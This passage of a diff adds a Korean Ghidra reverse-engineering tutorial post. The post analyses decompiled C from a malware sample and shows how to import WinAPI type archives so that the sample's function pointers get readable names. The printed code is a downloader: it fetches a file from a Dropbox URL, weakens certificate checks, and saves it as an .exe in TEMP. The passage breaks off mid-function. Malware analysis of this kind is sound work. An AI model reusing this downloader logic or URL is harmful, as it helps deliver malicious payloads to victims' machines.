+      local_28 = (*local_24)(local_20,&amp;amp;DAT_00413270,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;/s/uzu60whrg1spnyy/ATAPIConfiguration&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,
+                             &lt;span class=&#34;hljs-number&#34;&gt;0x800000&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
+      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_28 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+        uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+      }
+      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+        local_5c = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
+        pHVar4 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+        local_2c = GetProcAddress(pHVar4,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetQueryOptionW&amp;quot;&lt;/span&gt;);
+        iVar5 = (*local_2c)(local_28,&lt;span class=&#34;hljs-number&#34;&gt;0x1f&lt;/span&gt;,&amp;amp;local_58,&amp;amp;local_5c);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (iVar5 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+          pHVar4 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+          local_30 = GetProcAddress(pHVar4,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetSetOptionW&amp;quot;&lt;/span&gt;);
+          local_58 = local_58 | &lt;span class=&#34;hljs-number&#34;&gt;0x1180&lt;/span&gt;;
+          (*local_30)(local_28,&lt;span class=&#34;hljs-number&#34;&gt;0x1f&lt;/span&gt;,&amp;amp;local_58,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
+        }
+        pHVar4 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+        local_34 = GetProcAddress(pHVar4,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HttpSendRequestA&amp;quot;&lt;/span&gt;);
+        local_38 = (*local_34)(local_28,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+        local_3c = &lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;16000&lt;/span&gt;);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;memset&lt;/span&gt;(local_3c,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;16000&lt;/span&gt;);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;memset&lt;/span&gt;(DAT_00416028,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+        local_40 = getenv(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;TEMP&amp;quot;&lt;/span&gt;);
+        sVar6 = &lt;span class=&#34;hljs-built_in&#34;&gt;strlen&lt;/span&gt;(local_40);
+        DAT_0041602c = (LPCSTR)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(sVar6 + &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;strcpy&lt;/span&gt;(DAT_0041602c,local_40);
+        uVar8 = &lt;span class=&#34;hljs-number&#34;&gt;0xffffffff&lt;/span&gt;;
+        pCVar9 = DAT_0041602c;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; {
+          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (uVar8 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+          uVar8 = uVar8 - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+          cVar1 = *pCVar9;
+          pCVar9 = pCVar9 + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+        } &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (cVar1 != &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\0&amp;apos;&lt;/span&gt;);
+        puVar7 = (undefined4 *)(DAT_0041602c + (~uVar8 - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;));
+        *puVar7 = &lt;span class=&#34;hljs-number&#34;&gt;0x4154415c&lt;/span&gt;;
+        puVar7[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x6f434950&lt;/span&gt;;
+        puVar7[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x6769666e&lt;/span&gt;;
+        puVar7[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x74617275&lt;/span&gt;;
+        puVar7[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x2e6e6f69&lt;/span&gt;;
+        puVar7[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x657865&lt;/span&gt;;
+        MultiByteToWideChar(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,DAT_0041602c,&lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;,DAT_00416028,&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+        pHVar4 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+        local_44 = GetProcAddress(pHVar4,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CreateFileW&amp;quot;&lt;/span&gt;);
+        local_48 = (HANDLE)(*local_44)(DAT_00416028,&lt;span class=&#34;hljs-number&#34;&gt;0xc0000000&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x80&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+        local_60 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+        pHVar4 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+        local_4c = GetProcAddress(pHVar4,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetReadFile&amp;quot;&lt;/span&gt;);
+        pHVar4 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+        local_50 = GetProcAddress(pHVar4,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;WriteFile&amp;quot;&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_38 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+          uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+        }
+        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+          local_64 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+          &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt;( &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt; ) {
+            iVar5 = (*local_4c)(local_28,local_3c,&lt;span class=&#34;hljs-number&#34;&gt;0x2000&lt;/span&gt;,&amp;amp;local_64);
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((iVar5 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) || (local_64 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)) {
+              bVar2 = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+            }
+            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+              bVar2 = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+            }
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!bVar2) &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+            (*local_50)(local_48,local_3c,local_64,&amp;amp;local_60,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+          }
+          pHVar4 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+          local_54 = GetProcAddress(pHVar4,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetCloseHandle&amp;quot;&lt;/span&gt;);
+          CloseHandle(local_48);
+          (*local_54)(local_18);
+          (*local_54)(local_20);
+          (*local_54)(local_28);
+          uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+        }
+      }
+    }
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar3;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC774; &amp;#xCE5C;&amp;#xAD6C;&amp;#xB3C4; &amp;#xC0C1;&amp;#xB2F9;&amp;#xD788; &amp;#xC9C0;&amp;#xC800;&amp;#xBD84;&amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xC815;&amp;#xB9AC;&amp;#xAC00; &amp;#xD544;&amp;#xC694;&amp;#xD560; &amp;#xB4EF;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xAE4C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C; &amp;#xBC29;&amp;#xBC95;&amp;#xCC98;&amp;#xB7FC; &amp;#xBA3C;&amp;#xC800; Handle&amp;#xACFC; &amp;#xD568;&amp;#xC218; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB4E4;&amp;#xC744; &amp;#xC815;&amp;#xB9AC;&amp;#xD574;&amp;#xC90D;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2012.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC;&amp;#x2026; &lt;code&gt;InternetOpenW&lt;/code&gt;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xD0C0;&amp;#xC785;&amp;#xC774; &amp;#xC5C6;&amp;#xB2E4;&amp;#xACE0; &amp;#xB098;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD760;&amp;#x2026; &amp;#xBB50;&amp;#xAC00; &amp;#xBB38;&amp;#xC81C;&amp;#xC77C;&amp;#xAE4C;? Data Type Manager&amp;#xC5D0;&amp;#xC11C; &amp;#xCC3E;&amp;#xC544;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;. &lt;code&gt;InternetOpenW()&lt;/code&gt;&amp;#xB294; &lt;code&gt;wininet.h&lt;/code&gt;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xC774;&amp;#xB2C8; &lt;code&gt;wininet.h&lt;/code&gt;&amp;#xAC00; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xC744; &amp;#xD574;&amp;#xBCFC;&amp;#xAE4C;&amp;#xC694;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2013.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC5C6;&amp;#xB124;&amp;#xC694;&amp;#x2026; &amp;#xADF8;&amp;#xB7FC; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC9C0; &amp;#xBABB;&amp;#xD558;&amp;#xB294; &amp;#xAC78;&amp;#xAE4C;&amp;#xC694;? MSDN&amp;#xC744; &amp;#xBCF4;&amp;#xACE0; &amp;#xC190;&amp;#xC218; &amp;#xC791;&amp;#xC131;&amp;#xC744; &amp;#xD574;&amp;#xC57C; &amp;#xD558;&amp;#xB294; &amp;#xAC74;&amp;#xAC00;? &amp;#xC9C1;&amp;#xC811; &amp;#xD5E4;&amp;#xB354; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xCD94;&amp;#xAC00;&amp;#xD574;&amp;#xC57C; &amp;#xD558;&amp;#xB294; &amp;#xAC74;&amp;#xAC00;? &amp;#xC9C1;&amp;#xC811; &amp;#xD5E4;&amp;#xB354; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xCD94;&amp;#xAC00;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xB3C4; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xC774;&amp;#xB7F0; WinAPI&amp;#xB4E4;&amp;#xC758; &amp;#xC544;&amp;#xCE74;&amp;#xC774;&amp;#xBE0C; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xB204;&amp;#xAD70;&amp;#xAC00; github&amp;#xC5D0; &amp;#xC62C;&amp;#xB824;&amp;#xB193;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
+&lt;p&gt;&amp;#xC800;&amp;#xB294; Visual Studio Community&amp;#xB97C; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD574;&amp;#xC11C; &amp;#xD574;&amp;#xB2F9; &amp;#xD5E4;&amp;#xB354; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC9C1;&amp;#xC811; &amp;#xCD94;&amp;#xAC00;&amp;#xD558;&amp;#xACE0;&amp;#xC790; &amp;#xD558;&amp;#xC600;&amp;#xC73C;&amp;#xB098; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC774;&amp;#xC720;&amp;#xC5D0;&amp;#xC11C;&amp;#xC778;&amp;#xC9C0;&amp;#x2026; &amp;#xAC01;&amp;#xC885; reference&amp;#xB97C; &amp;#xCC3E;&amp;#xC544;&amp;#xC11C; &amp;#xB611;&amp;#xAC19;&amp;#xC774; &amp;#xD574;&amp;#xB3C4; &amp;#xCD94;&amp;#xAC00;&amp;#xAC00; &amp;#xC548;&amp;#xB418;&amp;#xB354;&amp;#xB77C;&amp;#xACE0;&amp;#xC694;&amp;#x2026; &amp;#xB611;&amp;#xAC19;&amp;#xC740; &amp;#xD589;&amp;#xC704;&amp;#xB97C; &amp;#xBC18;&amp;#xBCF5;&amp;#xD558;&amp;#xBA70; &amp;#xC5D4;&amp;#xD130;&amp;#xB97C; &amp;#xACC4;&amp;#xC18D; &amp;#xB204;&amp;#xB974;&amp;#xBA70; &amp;#xBD84;&amp;#xB178; &amp;#xAC8C;&amp;#xC774;&amp;#xC9C0;&amp;#xAC00; &amp;#xCC28;&amp;#xACE0; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2014.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xADF8;&amp;#xB7EC;&amp;#xB358; &amp;#xC640;&amp;#xC911; &amp;#xC544;&amp;#xB798;&amp;#xC758; github repo&amp;#xB294; &amp;#xC800;&amp;#xC5D0;&amp;#xAC8C; &amp;#xD070; &amp;#xB3C4;&amp;#xC6C0;&amp;#xC774; &amp;#xB418;&amp;#xC5C8;&amp;#xC8E0;!&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo&#34;&gt;https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC740; 32&amp;#xBE44;&amp;#xD2B8; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xC774;&amp;#xBBC0;&amp;#xB85C; &lt;code&gt;winapi_32.gdt&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2015.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2016.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xADF8; &amp;#xD6C4; Data Type Manager&amp;#xC758; &amp;#xC6B0;&amp;#xCE21; &amp;#xC0C1;&amp;#xB2E8;&amp;#xC5D0; &amp;#xC544;&amp;#xB798;&amp;#xCABD; &amp;#xD654;&amp;#xC0B4;&amp;#xD45C; &amp;#xBAA8;&amp;#xC591;&amp;#xC744; &amp;#xD074;&amp;#xB9AD;&amp;#xD55C; &amp;#xD6C4; Open File Archive&amp;#xB97C; &amp;#xD074;&amp;#xB9AD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2017.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xADF8;&amp;#xB2E4;&amp;#xC74C; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD55C; gdt &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC5F4;&amp;#xC5B4;&amp;#xC8FC;&amp;#xBA74; &amp;#xB05D;!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2018.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xCD94;&amp;#xAC00;&amp;#xAC00; &amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294; &amp;#xBAA8;&amp;#xC2B5;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xD6C4;&amp;#xD6C4; &amp;#xB2E4;&amp;#xB978; &amp;#xD568;&amp;#xC218; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB4E4;&amp;#xB3C4; &amp;#xBAA8;&amp;#xB450; &amp;#xC801;&amp;#xC6A9;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xC8E0;. &amp;#xC801;&amp;#xC6A9;&amp;#xC774; &amp;#xC644;&amp;#xB8CC;&amp;#xB41C; &amp;#xC18C;&amp;#xC2A4; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;undefined4 &lt;span class=&#34;hljs-title&#34;&gt;download_ATAPIConfiguration&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; cVar1;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; bVar2;
+  undefined4 uVar3;
+  HMODULE hModule;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; iVar4;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;size_t&lt;/span&gt; temp_path_len;
+  undefined4 *puVar5;
+  uint uVar6;
+  LPCSTR pCVar7;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_64;
+  undefined4 local_60;
+  undefined4 lpdwBufferLength;
+  uint lpBuffer;
+  FARPROC InternetCloseHandle_addr;
+  FARPROC WriteFile_addr;
+  FARPROC InternetReadFile_addr;
+  HANDLE local_48;
+  FARPROC CreateFileW_addr;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *temp_path;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *local_3c;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_38;
+  FARPROC HttpSendRequestA_addr;
+  FARPROC InternetSetOptionW;
+  FARPROC InternetQueryOptionW_addr;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; hInternet;
+  FARPROC HttpOpenRequestW_addr;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; hConnect;
+  FARPROC InternetConnectW_addr;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_18;
+  FARPROC InternetOpenW_addr;
+  HMODULE local_10;
+  
+  local_10 = LoadLibraryA(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+  InternetOpenW_addr = GetProcAddress(local_10,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetOpenW&amp;quot;&lt;/span&gt;);
+  local_18 = (*InternetOpenW_addr)(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;WINDOWS&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_18 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+    hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+    InternetConnectW_addr = GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetConnectW&amp;quot;&lt;/span&gt;);
+    hConnect = (*InternetConnectW_addr)(local_18,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;dl.dropboxusercontent.com&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x1bb&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (hConnect == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+      uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+    }
+    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+      hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+      HttpOpenRequestW_addr = GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HttpOpenRequestW&amp;quot;&lt;/span&gt;);
+      hInternet = (*HttpOpenRequestW_addr)
+                            (hConnect,&amp;amp;DAT_00413270,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;/s/uzu60whrg1spnyy/ATAPIConfiguration&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,
+                             &lt;span class=&#34;hljs-number&#34;&gt;0x800000&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
+      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (hInternet == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+        uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+      }
+      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+        lpdwBufferLength = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
+        hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+        InternetQueryOptionW_addr = GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetQueryOptionW&amp;quot;&lt;/span&gt;);
+        iVar4 = (*InternetQueryOptionW_addr)(hInternet,&lt;span class=&#34;hljs-number&#34;&gt;0x1f&lt;/span&gt;,&amp;amp;lpBuffer,&amp;amp;lpdwBufferLength);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (iVar4 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+          hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+          InternetSetOptionW = GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetSetOptionW&amp;quot;&lt;/span&gt;);
+          lpBuffer = lpBuffer | &lt;span class=&#34;hljs-number&#34;&gt;0x1180&lt;/span&gt;;
+          (*InternetSetOptionW)(hInternet,&lt;span class=&#34;hljs-number&#34;&gt;0x1f&lt;/span&gt;,&amp;amp;lpBuffer,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
+        }
+        hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+        HttpSendRequestA_addr = GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HttpSendRequestA&amp;quot;&lt;/span&gt;);
+        local_38 = (*HttpSendRequestA_addr)(hInternet,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+        local_3c = &lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;16000&lt;/span&gt;);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;memset&lt;/span&gt;(local_3c,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;16000&lt;/span&gt;);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;memset&lt;/span&gt;(download_path,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+        temp_path = getenv(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;TEMP&amp;quot;&lt;/span&gt;);
+        temp_path_len = &lt;span class=&#34;hljs-built_in&#34;&gt;strlen&lt;/span&gt;(temp_path);
+        DAT_0041602c = (LPCSTR)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(temp_path_len + &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;strcpy&lt;/span&gt;(DAT_0041602c,temp_path);
